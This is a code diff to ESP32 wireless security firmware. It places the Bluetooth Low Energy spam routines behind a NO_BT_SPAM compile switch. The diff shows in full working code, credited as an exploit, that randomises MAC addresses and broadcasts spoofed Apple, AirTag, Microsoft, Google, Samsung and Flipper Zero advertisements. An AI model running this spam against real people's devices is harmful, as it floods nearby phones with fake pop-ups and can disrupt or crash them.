@@ -53,6 +53,7 @@ extern "C" {
   //Exploit by ECTO-1A
   NimBLEAdvertising *pAdvertising;
 
+#ifndef NO_BT_SPAM
   //// https://github.com/Spooks4576
   NimBLEAdvertisementData WiFiScan::GetUniversalAdvertisementData(EBLEPayloadType Type) {
     NimBLEAdvertisementData AdvData = NimBLEAdvertisementData();
@@ -289,6 +290,7 @@ extern "C" {
 
     return AdvData;
   }
+#endif   //   NO_BT_SPAM
   //// https://github.com/Spooks4576
 
 
@@ -4489,14 +4491,54 @@ void WiFiScan::RunPwnScan(uint8_t scan_mode, uint16_t color) {
   initTime = millis();
 }
 
+#ifndef NO_BT_SPAM
 void WiFiScan::executeBLESpam(EBLEPayloadType type) {
-  #ifdef HAS_BT
-    uint32_t now_time = millis();
-    uint8_t macAddr[6];
-    generateRandomMac(macAddr);
+#ifdef HAS_BT
+  uint32_t now_time = millis();
+  uint8_t macAddr[6];
+  generateRandomMac(macAddr);
 
-    if (type == Apple2) {
+  if (type == Apple2) {
+    this->setBaseMacAddress(macAddr);
+    NimBLEDevice::init("");
+    #ifdef HAS_NIMBLE_2
+      if (!NimBLEDevice::setPower(20))
+        Serial.println("Failed to set NimBLE output power");
+    #endif
+    NimBLEServer *pServer = NimBLEDevice::createServer();
+
+    pAdvertising = pServer->getAdvertising();
+
+    delay(10);
+
+    NimBLEAdvertisementData advertisementData = this->GetUniversalAdvertisementData(Apple);
+    pAdvertising->setAdvertisementData(advertisementData);
+
+    #ifdef HAS_NIMBLE_2
+      pAdvertising->setConnectableMode((random(2) == 0) ? BLE_GAP_CONN_MODE_NON : BLE_GAP_CONN_MODE_UND);
+      pAdvertising->setDiscoverableMode(random(3));
+      pAdvertising->setMinInterval(0x20);
+      pAdvertising->setMaxInterval(0x20);
+      pAdvertising->setPreferredParams(0x20, 0x20);
+    #else
+      pAdvertising->setMaxInterval(0x20);
+      pAdvertising->setMinInterval(0x20);
+      pAdvertising->setMinPreferred(0x20);
+      pAdvertising->setMaxPreferred(0x20);
+    #endif
+
+    pAdvertising->start();
+    delay(500);
+    pAdvertising->stop();
+
+    delay(10);
+
+    NimBLEDevice::deinit();
+  }
+  else if (type == Apple) {
+    if ((now_time - this->last_sour_apple_update > 1000) || (this->last_sour_apple_update == 0) || (!this->ble_initialized)) {
       this->setBaseMacAddress(macAddr);
+
       NimBLEDevice::init("");
       #ifdef HAS_NIMBLE_2
         if (!NimBLEDevice::setPower(20))
@@ -4506,128 +4548,90 @@ void WiFiScan::executeBLESpam(EBLEPayloadType type) {
 
       pAdvertising = pServer->getAdvertising();
 
-      delay(10);
+      delay(40);
 
       NimBLEAdvertisementData advertisementData = this->GetUniversalAdvertisementData(Apple);
       pAdvertising->setAdvertisementData(advertisementData);
 
-      #ifdef HAS_NIMBLE_2
-        pAdvertising->setConnectableMode((random(2) == 0) ? BLE_GAP_CONN_MODE_NON : BLE_GAP_CONN_MODE_UND);
-        pAdvertising->setDiscoverableMode(random(3));
-        pAdvertising->setMinInterval(0x20);
-        pAdvertising->setMaxInterval(0x20);
-        pAdvertising->setPreferredParams(0x20, 0x20);
-      #else
-        pAdvertising->setMaxInterval(0x20);
-        pAdvertising->setMinInterval(0x20);
-        pAdvertising->setMinPreferred(0x20);
-        pAdvertising->setMaxPreferred(0x20);
-      #endif
-
-      pAdvertising->start();
-      delay(500);
-      pAdvertising->stop();
-
-      delay(10);
-
-      NimBLEDevice::deinit();
+      this->ble_initialized = true;
     }
-    else if (type == Apple) {
-      if ((now_time - this->last_sour_apple_update > 1000) || (this->last_sour_apple_update == 0) || (!this->ble_initialized)) {
+
+    pAdvertising->start();
+    delay(60);
+    pAdvertising->stop();
+
+    if ((now_time - this->last_sour_apple_update > 1000) || (this->last_sour_apple_update == 0)) {
+      this->last_sour_apple_update = now_time;
+      NimBLEDevice::deinit();
+      this->ble_initialized = false;
+    }
+  }
+  else if (type == Airtag) {
+    for (int i = 0; i < airtags->size(); i++) {
+      AirTag airtag = airtags->get(i);
+      if (airtag.selected) {
+        convertMacStringToUint8(airtag.mac, macAddr);
+
+        macAddr[5] -= 2;
+
+        // Do this because ESP32 BT addr is Base MAC + 2
+        
         this->setBaseMacAddress(macAddr);
 
         NimBLEDevice::init("");
+
         #ifdef HAS_NIMBLE_2
           if (!NimBLEDevice::setPower(20))
             Serial.println("Failed to set NimBLE output power");
         #endif
+
         NimBLEServer *pServer = NimBLEDevice::createServer();
 
         pAdvertising = pServer->getAdvertising();
 
-        delay(40);
-
-        NimBLEAdvertisementData advertisementData = this->GetUniversalAdvertisementData(Apple);
+        //NimBLEAdvertisementData advertisementData = getSwiftAdvertisementData();
+        NimBLEAdvertisementData advertisementData = this->GetUniversalAdvertisementData(Airtag);
         pAdvertising->setAdvertisementData(advertisementData);
+        pAdvertising->start();
+        delay(10);
+        pAdvertising->stop();
 
-        this->ble_initialized = true;
-      }
+        //#ifndef HAS_DUAL_BAND
+          NimBLEDevice::deinit();
+        //#endif
 
-      pAdvertising->start();
-      delay(60);
-      pAdvertising->stop();
-
-      if ((now_time - this->last_sour_apple_update > 1000) || (this->last_sour_apple_update == 0)) {
-        this->last_sour_apple_update = now_time;
-        NimBLEDevice::deinit();
-        this->ble_initialized = false;
+        break;
       }
     }
-    else if (type == Airtag) {
-      for (int i = 0; i < airtags->size(); i++) {
-        AirTag airtag = airtags->get(i);
-        if (airtag.selected) {
-          convertMacStringToUint8(airtag.mac, macAddr);
+  }
+  else if ((type == Microsoft) ||
+           (type == Google) ||
+           (type == Samsung) ||
+           (type == FlipperZero)) {
+    this->setBaseMacAddress(macAddr);
 
-          macAddr[5] -= 2;
+    NimBLEDevice::init("");
 
-          // Do this because ESP32 BT addr is Base MAC + 2
-          
-          this->setBaseMacAddress(macAddr);
+    #ifdef HAS_NIMBLE_2
+      if (!NimBLEDevice::setPower(20))
+        Serial.println("Failed to set NimBLE output power");
+    #endif
 
-          NimBLEDevice::init("");
+    NimBLEServer *pServer = NimBLEDevice::createServer();
 
-          #ifdef HAS_NIMBLE_2
-            if (!NimBLEDevice::setPower(20))
-              Serial.println("Failed to set NimBLE output power");
-          #endif
+    pAdvertising = pServer->getAdvertising();
 
-          NimBLEServer *pServer = NimBLEDevice::createServer();
+    NimBLEAdvertisementData advertisementData = this->GetUniversalAdvertisementData(type);
+    pAdvertising->setAdvertisementData(advertisementData);
+    pAdvertising->start();
+    delay(10);
+    pAdvertising->stop();
 
-          pAdvertising = pServer->getAdvertising();
-
-          //NimBLEAdvertisementData advertisementData = getSwiftAdvertisementData();
-          NimBLEAdvertisementData advertisementData = this->GetUniversalAdvertisementData(Airtag);
-          pAdvertising->setAdvertisementData(advertisementData);
-          pAdvertising->start();
-          delay(10);
-          pAdvertising->stop();
-
-          //#ifndef HAS_DUAL_BAND
-            NimBLEDevice::deinit();
-          //#endif
-
-          break;
-        }
-      }
-    }
-    else if ((type == Microsoft) ||
-             (type == Google) ||
-             (type == Samsung) ||
-             (type == FlipperZero)) {
-      this->setBaseMacAddress(macAddr);
-
-      NimBLEDevice::init("");
-
-      #ifdef HAS_NIMBLE_2
-        if (!NimBLEDevice::setPower(20))
-          Serial.println("Failed to set NimBLE output power");
-      #endif
-
-      NimBLEServer *pServer = NimBLEDevice::createServer();
-
-      pAdvertising = pServer->getAdvertising();
-
-      NimBLEAdvertisementData advertisementData = this->GetUniversalAdvertisementData(type);
-      pAdvertising->setAdvertisementData(advertisementData);
-      pAdvertising->start();
-      delay(10);
-      pAdvertising->stop();
-
-      NimBLEDevice::deinit();
-    }
-  #endif
+    NimBLEDevice::deinit();
+  }
+#endif
 }
+#endif  // NO_BT_SPAM
 
 /*void WiFiScan::executeAppleJuice() { // Slower version of Sour Apple, pop up device easier
   #ifdef HAS_BT
